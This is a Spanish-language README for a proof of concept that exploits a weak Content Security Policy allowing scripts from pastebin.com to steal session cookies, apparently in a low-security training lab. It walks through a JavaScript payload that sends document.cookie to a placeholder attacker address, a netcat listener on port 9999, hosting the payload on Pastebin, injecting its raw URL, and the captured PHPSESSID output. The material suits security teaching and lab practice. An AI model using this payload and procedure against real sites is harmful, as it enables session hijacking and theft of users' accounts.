# Explotación de Content Security Policy (CSP) para Robo de Cookies (Nivel Bajo)

Este README describe una prueba de concepto para explotar una configuración de Content Security Policy (CSP) débil para robar cookies de sesión. **Esta técnica debe utilizarse únicamente en entornos de prueba autorizados.**

## Descripción

Este exploit de bajo nivel se aprovecha de una CSP que permite la inclusión de scripts desde el dominio `pastebin.com`. Al inyectar una URL a un payload malicioso alojado en Pastebin, es posible ejecutar código JavaScript arbitrario en el contexto de la página web vulnerable y robar las cookies del usuario.

## Herramientas Necesarias

* Navegador web (se recomienda Firefox)
* Acceso a [Pastebin](https://pastebin.com/)
* Un servidor web para recibir las cookies robadas (o `netcat` para pruebas)

## Pasos de la Explotación

1.  **Descubrir la CSP:** Analizar las cabeceras HTTP de la página web objetivo para identificar la directiva `Content-Security-Policy` y las fuentes permitidas en `script-src`. Se asume que `https://pastebin.com` está permitido.

2.  **Preparar el Payload de Robo de Cookies:** Crear un script JavaScript que acceda a `document.cookie` y lo envíe a un servidor controlado por el atacante. Ejemplo:

    ```javascript
    fetch('http://TU_IP:9999/?cookies=' + document.cookie);
    console.log('Cookies sent!');
    ```

    Reemplazar `TU_IP` con la dirección IP del servidor receptor.

3.  **Iniciar el Servidor de Recepción de Cookies:**
    * **Usando `netcat`:** Abrir una terminal y ejecutar:
        ```bash
        nc -lvp 9999
        ```
    * **Usando un servidor web:** Asegurarse de que el servidor esté en funcionamiento y configurado para recibir peticiones GET con el parámetro `cookies`.

4.  **Subir el Payload a Pastebin:**
    * Ir a [https://pastebin.com/](https://pastebin.com/).
    * Pegar el código JavaScript en el campo "New Paste".
    * Seleccionar "JavaScript" en "Syntax Highlighting".
    * Elegir la visibilidad deseada (por ejemplo, "Unlisted").
    * Hacer clic en "Create New Paste".

5.  **Obtener la URL "Raw" de Pastebin:** Acceder a la página del paste creado y obtener la URL de la versión "Raw".

6.  **Explotar la CSP e Inyectar el Payload:**
    * Volver a la página web vulnerable.
    * Abrir la consola de desarrollador del navegador (Ctrl+Shift+K en Firefox).
    * Pegar la URL "Raw" de Pastebin en el campo o mecanismo que permita la inclusión de scripts externos (como un formulario de inclusión).
    * Ejecutar la acción para incluir el script.

7.  **Verificar la Ejecución y Recepción de Cookies:**
    * **Consola del navegador:** Verificar si aparece el mensaje `Cookies sent!`.
    * **Servidor de recepción:**
        * **`netcat`:** Debería mostrar una conexión entrante con una línea similar a:
            ```
            GET /?cookies=PHPSESSID=valor_de_la_sesion; otra_cookie=otro_valor; ... HTTP/1.1
            Host: TU_IP:9999
            ...
            ```
        * **Servidor web:** Revisar los logs del servidor para la petición GET con el parámetro `cookies`.

## Resultado

La recepción exitosa de las cookies, incluyendo la `PHPSESSID`, demuestra la vulnerabilidad de la CSP y el potencial para el secuestro de sesión.

**Advertencia:** El uso de estas técnicas sin autorización es ilegal y éticamente inaceptable. Este documento se proporciona únicamente con fines educativos y de prueba en entornos controlados.